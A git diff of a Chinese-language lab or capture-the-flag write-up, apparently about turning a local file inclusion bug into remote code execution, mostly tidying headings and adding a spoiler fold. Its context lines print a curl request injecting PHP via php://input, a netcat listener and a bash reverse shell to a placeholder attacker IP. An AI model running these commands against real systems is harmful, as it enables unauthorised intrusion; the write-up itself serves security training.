@@ -791,7 +791,9 @@ fetch(`/getflag\)
 
   </details>
 
-### 利用 LFI 拿 reverse shell
+### 利用 LFI 拿 Reverse Shell
+
+<details markdown="1"><summary><span class="spoiler">RCE 方法</span></summary>
 
 - PHP filter + base64（確認能讀檔）
 
@@ -817,14 +819,15 @@ fetch(`/getflag\)
   ```bash
   $ curl -X POST "http://mountaindesserts.local/meteor/index.php?page=php://input" -d "<?php system('id'); ?>"
   ```
+  </details>
 
-確認 RCE 後，送 reverse shell
+確認 RCE 後，送 Reverse Shell
 
 ```bash
 $ nc -lvnp 4444
 ```
 
-透過 RCE 執行：
+透過 RCE 拿 Reverse Shell
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/<攻擊者IP>/4444 0>&1'
